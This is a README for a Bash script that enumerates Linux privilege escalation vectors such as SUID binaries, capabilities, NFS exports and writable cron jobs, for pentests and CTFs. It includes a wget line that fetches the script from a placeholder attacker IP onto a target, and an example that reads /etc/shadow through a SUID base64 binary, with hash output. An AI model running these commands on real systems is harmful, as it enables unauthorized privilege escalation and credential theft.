# Linux PrivEsc Checker

A simple Bash script to automate the search for common Linux privilege escalation vectors.

This script is designed to be lightweight and easy to upload to a target machine during a penetration test or CTF to quickly enumerate potential weaknesses.

## 🚀 Demo

Here is the script in action, identifying a SUID binary (`base64`) and other potential vectors.

<img width="2580" height="1390" alt="Snapshot_2025-10-25_07-53-10" src="https://github.com/user-attachments/assets/bdafbf82-5dc3-4e36-a086-cac18790758d" />


## ✨ Features

This script automatically hunts for:

  * **🕵️‍♂️ SUID Binaries:** Scans for suspicious SUID binaries (like `base64`, `nmap`, `find`, etc.) that can be used to escalate privileges.
  * **⚙️ Linux Capabilities:** Searches for binaries with dangerous capabilities (e.g., `cap_sys_admin`, `cap_setuid`).
  * **📁 NFS Exports:** Checks `/etc/exports` for insecure `no_root_squash` configurations.
  * **⏰ Writable Cron Jobs:** Looks for `root` cron jobs that execute scripts or binaries in writable locations.
  * **🛡️ Vulnerable Versions:** Performs a basic check against known vulnerable versions of `sudo` and the Kernel.

## 💻 Usage

### 1\. Clone the Repository

```bash
git clone https://github.com/MS-0x404/Linux-PrivEsc-Checker.git
cd Linux-PrivEsc-Checker
chmod +x privesc.sh
./privesc.sh
```

### 2\. On Target Machine

This is the recommended method for use during a pentest, as seen in the demo video.

1.  Navigate to a writable directory (e.g., `/tmp`):

    ```bash
    cd /tmp
    ```

2.  Download the script from a web server you control (e.g., Python's `http.server`):

    ```bash
    wget http://YOUR-ATTACKER-IP:8000/privesc.sh
    ```

3.  Make it executable:

    ```bash
    chmod +x privesc.sh
    ```

4.  Run it\!

    ```bash
    ./privesc.sh
    ```

## 💡 Example: SUID Exploit

```bash
$ ./privesc.sh

    [...]
    Ricerca Privilege Escalation...

[+] Possibile PrivEsc tramite SUID:
  └─ /usr/bin/base64
[+] Possibile PrivEsc tramite Capabilities:
  └─ /usr/bin/python3.13 cap_setuid=eip
[-] Nessuna PrivEsc tramite NFS
[...]
```

**Exploitation:**

```bash
$ base64 /etc/shadow | base64 -d
ubuntu:$y$j9T$vTJesvSYgTtcVv//OGDCPytz0b$HVjAkS46CYIilgc..:19999:7:::
daemon:*:19193:0:99999:7:::
[...]
test:$y$j9T$vTJesvSYgTtcVv//OGDCPytz0b$HVjAkS46CYIilgc..:19999:7:::
```

-----

## ⚠️ Disclaimer

This tool is intended for **educational and authorized testing purposes ONLY**. Do not use this script on any system you do not have explicit permission to test. The author is not responsible for any misuse or damage caused by this script.
